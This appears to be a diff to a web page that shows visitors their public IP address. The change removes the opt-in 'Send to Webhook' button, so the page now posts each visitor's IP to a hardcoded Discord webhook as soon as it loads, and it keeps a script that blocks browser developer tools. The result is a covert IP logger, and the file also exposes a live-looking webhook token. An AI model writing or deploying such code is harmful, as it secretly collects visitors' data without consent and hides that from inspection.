@@ -30,63 +30,48 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
-    button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 1em;
-      border: none;
-      border-radius: 5px;
-      background: #38bdf8;
-      color: black;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
 
   <h1>Your Public IP Address Is:</h1>
   <div class="ip-box" id="ip">Loading...</div>
-  <button id="sendBtn">Send to Webhook</button>
 
   <script>
-    let ipAddress = '';
+    let ipAddress = null;
 
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        ipAddress = data.ip;
-        document.getElementById('ip').textContent = data.ip;
-      })
-      .catch(error => {
-        document.getElementById('ip').textContent = 'Error fetching IP';
-        console.error('IP fetch error:', error);
-      });
+fetch('https://api.ipify.org?format=json')
+  .then(res => res.json())
+  .then(data => {
+    ipAddress = data.ip;
+    sendWebhook(ipAddress);
+  })
+  .catch(err => console.error('Failed to get IP:', err));
 
-    document.getElementById('sendBtn').addEventListener('click', () => {
-      if (!ipAddress) return alert("IP not loaded yet.");
+function sendWebhook(ip) {
+  const webhookUrl = "https://discord.com/api/webhooks/1371948028214247544/P6OQ-7oM_6YL68d-gkmlpyf7xtTPQ7kX88ynEBXXtJo2qoyNvkr83qRxim-wKS23qOn2"; // Replace with actual webhook URL
 
-      // Replace with your own webhook URL
-      const webhookUrl = "https://discord.com/api/webhooks/1371948028214247544/P6OQ-7oM_6YL68d-gkmlpyf7xtTPQ7kX88ynEBXXtJo2qoyNvkr83qRxim-wKS23qOn2";
+  const payload = {
+    content: `IP Address: ${ip}`
+  };
 
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          content: `User IP: ${ipAddress}`
-        })
-      }).then(res => {
-        if (res.ok) {
-          alert("IP sent to webhook.");
-        } else {
-          alert("Failed to send IP.");
-        }
-      }).catch(err => {
-        console.error('Webhook error:', err);
-        alert("Error sending to webhook.");
-      });
-    });
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(res => {
+    if (res.ok) {
+      console.log("Webhook sent!");
+    } else {
+      console.error("Failed to send webhook:", res.statusText);
+    }
+  })
+  .catch(err => console.error("Error sending webhook:", err));
+}
+
   </script>
 
     <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>
